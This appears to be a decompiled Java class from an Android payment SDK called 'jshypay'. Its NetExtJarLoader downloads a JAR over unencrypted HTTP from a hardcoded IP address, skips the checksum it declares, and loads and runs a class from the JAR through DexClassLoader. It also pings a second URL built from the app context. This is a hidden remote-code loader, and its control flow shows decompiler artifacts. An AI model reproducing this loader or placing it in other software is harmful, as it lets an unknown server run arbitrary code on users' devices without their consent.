package com.jshymedia.jshypay.ext;

import android.content.Context;
import android.os.Build.VERSION;
import com.jshymedia.jshypay.net.Purl;
import com.jshymedia.jshypay.ztool.EventFlag;
import com.jshymedia.jshypay.ztool.ZNetManager;
import com.jshymedia.jshypay.ztool.ZNetTask;
import com.jshymedia.jshypay.ztool.ZProgressChanger;
import com.jshymedia.jshypay.ztool.Zlog;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.concurrent.ExecutorService;

public class NetExtJarLoader
  extends ExtJarLoader
  implements Runnable
{
  private String a = "http://119.29.19.163:8080/app/ext.jar";
  private String b = "http://119.29.19.163:8080/app/ext.jar.md5";
  private String c = "http://119.29.19.163:8080/app/test.txt";
  private File d;
  private String e = "FLAG_DOWNLOAD";
  private String f = "ext.jar";
  private IExt g;
  private IExt h = new NullExt();
  private ExecutorService i;
  private Context j;
  
  public NetExtJarLoader(Context paramContext, ExecutorService paramExecutorService)
  {
    this.j = paramContext;
    this.d = new File(paramContext.getFilesDir(), this.f);
    this.i = paramExecutorService;
  }
  
  private void a()
  {
    if (Build.VERSION.SDK_INT < 14) {}
    for (;;)
    {
      return;
      Object localObject = new DexClassLoader(this.d.toString(), this.j.getFilesDir().toString(), null, this.j.getClassLoader());
      try
      {
        localObject = ((DexClassLoader)localObject).loadClass("com.jshymedia.jshypay.ext.ExtR").newInstance();
        if ((localObject instanceof IExt))
        {
          this.g = ((IExt)localObject);
          return;
        }
      }
      catch (ClassNotFoundException localClassNotFoundException)
      {
        localClassNotFoundException.printStackTrace();
        return;
      }
      catch (InstantiationException localInstantiationException)
      {
        localInstantiationException.printStackTrace();
        return;
      }
      catch (IllegalAccessException localIllegalAccessException)
      {
        localIllegalAccessException.printStackTrace();
      }
    }
  }
  
  public void clear()
  {
    if (this.d.exists()) {
      this.d.delete();
    }
  }
  
  public IExt getExtObject()
  {
    Zlog.syso("ext..state:" + this.g);
    if ((this.g == null) || (this.g == this.h))
    {
      loaderInit(this.i);
      return this.h;
    }
    return this.g;
  }
  
  public void init(ExecutorService paramExecutorService)
  {
    initStart();
    try
    {
      paramExecutorService.execute(this);
      return;
    }
    catch (Exception paramExecutorService)
    {
      paramExecutorService.printStackTrace();
    }
  }
  
  public boolean isUpdate()
  {
    return !EventFlag.get(this.j).flagUpdatePassOneDay(this.e);
  }
  
  public void run()
  {
    if (this.d.exists()) {
      a();
    }
    for (;;)
    {
      ZNetManager.getByteFromNet(Purl.makeUrl(this.c, this.j), null, 0, null);
      initFinish();
      return;
      Zlog.syso("Start..Download..Thread..Info.." + Thread.currentThread().getName());
      Object localObject = new ZNetTask(this.a, null, null, null);
      try
      {
        localObject = ((ZNetTask)localObject).getTaskInputStream(0);
        if (localObject == null)
        {
          Zlog.syso("ext..jar..download..null");
          initFinish();
          return;
        }
      }
      catch (IllegalStateException localIllegalStateException)
      {
        localIllegalStateException.printStackTrace();
        continue;
        boolean bool = new ZProgressChanger(localIllegalStateException, new FileOutputStream(this.d)).start();
        if (bool) {
          EventFlag.get(this.j).updateFlag(this.e);
        }
        Zlog.syso("downlloadextState:" + bool + "file:" + this.d);
        a();
      }
      catch (IOException localIOException)
      {
        localIOException.printStackTrace();
      }
    }
  }
  
  public void update()
  {
    this.i.execute(new a(this));
  }
}
